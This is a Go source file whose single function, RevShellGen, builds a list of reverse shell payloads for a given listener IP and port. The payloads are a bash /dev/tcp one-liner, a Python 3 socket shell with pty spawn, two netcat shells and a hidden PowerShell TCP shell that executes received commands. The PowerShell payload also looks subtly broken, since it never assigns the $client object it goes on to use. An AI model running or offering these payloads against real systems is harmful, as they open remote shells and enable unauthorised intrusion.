package tools

import (
	"fmt"
	"strings"
)

func RevShellGen(ip string, port string) string {
	if port == "" {
		port = "4444"
	}
	
	var sb strings.Builder
	sb.WriteString("=== REVERSE SHELL PAYLOADS ===\n")
	sb.WriteString(fmt.Sprintf("LHOST: %s | LPORT: %s\n\n", ip, port))

	sb.WriteString("[BASH TCP]\n")
	sb.WriteString(fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1\n\n", ip, port))

	sb.WriteString("[PYTHON 3]\n")
	sb.WriteString(fmt.Sprintf("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'\n\n", ip, port))

	sb.WriteString("[NETCAT]\n")
	sb.WriteString(fmt.Sprintf("nc -e /bin/sh %s %s\n", ip, port))
	sb.WriteString(fmt.Sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f\n\n", ip, port))

	sb.WriteString("[POWERSHELL]\n")
	sb.WriteString(fmt.Sprintf("powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"%s\",%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n", ip, port))

	return sb.String()
}
